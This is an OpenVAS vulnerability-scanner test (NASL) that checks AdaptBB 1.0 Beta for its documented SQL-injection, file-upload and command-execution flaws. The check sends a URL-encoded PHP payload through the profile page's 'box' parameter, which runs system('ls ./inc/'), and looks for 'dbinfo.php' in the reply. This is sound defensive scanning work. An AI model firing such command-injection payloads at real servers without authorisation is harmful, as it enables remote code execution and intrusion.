###############################################################################
# OpenVAS Vulnerability Test
# $Id: adaptbb_34452.nasl 4574 2016-11-18 13:36:58Z teissa $
#
# AdaptBB Multiple Input Validation Vulnerabilities
#
# Authors
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "AdaptBB is prone to multiple security vulnerabilities because it
  fails to adequately sanitize user-supplied input. These
  vulnerabilities include multiple SQL-injection issues, an
  arbitrary-file-upload issue, and an arbitrary-command-execution
  issue.

  Exploiting these issues can allow an attacker to upload and execute
  arbitrary files, compromise the application, access or modify data,
  or exploit latent vulnerabilities in the underlying database. Other
  attacks may also be possible.

  AdaptBB 1.0 Beta is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100128);
 script_version("$Revision: 4574 $");
 script_tag(name:"last_modification", value:"$Date: 2016-11-18 14:36:58 +0100 (Fri, 18 Nov 2016) $");
 script_tag(name:"creation_date", value:"2009-04-12 20:09:50 +0200 (Sun, 12 Apr 2009)");
 script_bugtraq_id(34452);
 script_tag(name:"cvss_base", value:"9.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");

 script_name("AdaptBB Multiple Input Validation Vulnerabilities");


 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("adaptbb_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34452");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!version = get_kb_item(string("www/", port, "/adaptbb")))exit(0);
if(!matches = eregmatch(string:version, pattern:"^(.+) under (/.*)$"))exit(0);

dir  = matches[2];

  if(!isnull(dir)) {
     url = string(dir, "/index.php?do=profile&user=blabla&box=%3C?php%20echo%20%22%3Cpre%3E%22;%20system(%22ls%20./inc/%22);%20echo%20%22%3C/pre%3E%22;?%3E");
     req = http_get(item:url, port:port);
     buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
     if( buf == NULL )continue;
    
     if(egrep(pattern:"dbinfo.php", string: buf))
       {    
  	   security_message(port:port);
	   exit(0);
       }
  }


exit(0);
